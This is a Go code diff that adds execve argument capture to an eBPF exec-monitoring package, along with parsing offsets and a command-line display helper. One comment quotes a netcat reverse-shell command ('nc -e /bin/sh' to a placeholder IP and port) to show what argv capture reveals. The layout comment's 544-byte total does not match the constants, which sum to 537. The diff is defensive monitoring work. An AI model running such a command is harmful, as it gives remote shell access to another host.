@@ -1,6 +1,7 @@
 package ebpf
 
 import (
+	"bytes"
 	"context"
 	"encoding/binary"
 	"fmt"
@@ -187,6 +188,27 @@ type ProcessEvent struct {
 	// AncestryDepth entries and truncated at pid 1. A denial reads far better
 	// as "nginx -> sh -> curl" than as "curl was denied".
 	Ancestry []Ancestor
+
+	// Args is argv as captured on entry to the execve. It is what separates
+	// "nc ran" from "nc -e /bin/sh 10.0.0.1 4444". Args[0] is the program name
+	// as the caller passed it, which is not necessarily Filename.
+	Args []string
+	// ArgsTruncated reports that the command line did not fit in the captured
+	// buffer, so Args is a prefix rather than the whole thing.
+	ArgsTruncated bool
+}
+
+// CommandLine renders Args the way a shell would show it. It is a display
+// helper, not a quoting-correct reconstruction.
+func (e *ProcessEvent) CommandLine() string {
+	if len(e.Args) == 0 {
+		return e.Filename
+	}
+	s := strings.Join(e.Args, " ")
+	if e.ArgsTruncated {
+		s += " ..."
+	}
+	return s
 }
 
 // AncestryChain renders the lineage oldest-first with the execing process last,
@@ -472,6 +494,27 @@ func (m *Manager) AttachPrograms() error {
 			} else {
 				m.execLinks = append(m.execLinks, l)
 			}
+		}
+
+		// argv is captured on syscall entry, where it is still a pointer into
+		// the caller's address space. Attaching these is best-effort and
+		// separate from the LSM hook: without them exec events still carry the
+		// binary, just not its arguments.
+		for tp, prog := range map[string]string{
+			"sys_enter_execve":   "handle_execve_args",
+			"sys_enter_execveat": "handle_execveat_args",
+		} {
+			p := m.execCollection.Programs[prog]
+			if p == nil {
+				continue
+			}
+			l, err := link.Tracepoint("syscalls", tp, p, nil)
+			if err != nil {
+				log.Log.V(0).Info("execve argument capture unavailable; exec events will carry no argv",
+					"tracepoint", tp, "error", err.Error())
+				continue
+			}
+			m.execLinks = append(m.execLinks, l)
 		}
 	}
 
@@ -1297,7 +1340,11 @@ const AncestryDepth = 4
 //	        __u32 pid; __u8 comm[16];
 //	} ancestry[4];
 //	__u8  filename[128];          // 144
-//	                              // 272 total
+//	__u32 args_count;             // 272
+//	__u32 args_len;               // 276
+//	__u8  args_truncated;         // 280
+//	__u8  args[256];              // 281
+//	                              // 544 total
 //
 // Spelled out as named constants because a wrong offset here decodes into
 // plausible-looking garbage rather than failing, which is exactly the kind of
@@ -1308,7 +1355,13 @@ const (
 	execOffAncestry  = 64
 	execAncestorSize = 20
 	execOffFilename  = execOffAncestry + AncestryDepth*execAncestorSize
-	execEventSize    = execOffFilename + 128
+	execOffArgsCount = execOffFilename + 128
+	execOffArgsLen   = execOffArgsCount + 4
+	execOffArgsTrunc = execOffArgsLen + 4
+	execOffArgs      = execOffArgsTrunc + 1
+	// ArgsMax matches ARGS_MAX in bpf/exec_monitor.c.
+	ArgsMax       = 256
+	execEventSize = execOffArgs + ArgsMax
 )
 
 func parseProcessEvent(data []byte) *ProcessEvent {
@@ -1331,7 +1384,21 @@ func parseProcessEvent(data []byte) *ProcessEvent {
 	}
 	ev.Comm = cut(data[execOffComm : execOffComm+16])
 	ev.ParentComm = cut(data[execOffParent : execOffParent+16])
-	ev.Filename = cut(data[execOffFilename:execEventSize])
+	ev.Filename = cut(data[execOffFilename : execOffFilename+128])
+
+	// argv, NUL separated exactly as /proc/<pid>/cmdline presents it.
+	ev.ArgsTruncated = data[execOffArgsTrunc] != 0
+	if n := int(binary.LittleEndian.Uint32(data[execOffArgsLen : execOffArgsLen+4])); n > 0 {
+		if n > ArgsMax {
+			n = ArgsMax
+		}
+		raw := data[execOffArgs : execOffArgs+n]
+		for _, field := range bytes.Split(raw, []byte{0}) {
+			if len(field) > 0 {
+				ev.Args = append(ev.Args, string(field))
+			}
+		}
+	}
 
 	// The chain is terminated by the first zero pid, so a shallow lineage does
 	// not report phantom ancestors.
